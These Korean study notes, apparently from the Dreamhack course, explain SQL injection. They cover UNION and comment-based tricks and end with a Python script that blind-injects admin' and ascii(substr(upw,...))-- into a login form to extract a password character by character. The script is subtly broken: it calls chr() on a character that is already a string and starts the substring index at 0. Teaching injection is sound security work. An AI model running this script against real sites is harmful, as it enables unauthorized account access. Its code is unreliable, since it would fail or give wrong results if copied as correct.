## SQL Injection
### SQL Injection
---
#### SQL Injection이란?
웹 서비스는 이용자의 입력을 SQL구문에 포함해 요청하는 경우가 있다. 이 때 이용자가 SQL구문에 임의 문자열을 삽입하는 행위를 SQL Injection이라고 한다. SQL Injection이 발생하면 조작된 쿼리로 인증을 우회하거나, 데이터베이스의 정보를 유출할 수 있다.
#### Simple SQL Injection
단순히 sql을 변환하여 Injection하는 것이다. union을 이용하여 추가 연산을 할 수 있거나, `--`, `#`, `/**/`와 같이 주석을 이용하는 등 다양한 방법으로 Injection할 수 있다.
#### Blind SQL Injection
데이터베이스에 데이터를 알아내느 Injection이다. 질의 결과를 이용자가 직접 확인하지 않고, 참/ 거짓 반환 결과로 데이터를 획득하는 공격 기법이다.
* ascii
전달된 문자를 아스키 형태로 변환하는 함수이다.
* substr
문자열에서 지정한 위치부터 길이까지의 값을 가져온다.
#### Blind SQL Injection 공격 스크립트
한 바이트씩 비교하여 공격하므로 많은 시간이 필요하다. 그러므로 공격을 자동화하는 스크립트를 만들 필요가 있다.
* requests
이 모듈 뒤에 get이나 post를 이용하여 요청을 전송할 수 있다.
```py
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)

import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```
우선 사용자가 작성할만한 비밀번호는 알파벳, 숫자, 특수문자이다. 이것을 아스키 범위로 나타내면 32부터 126까지이다. 
```py
#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```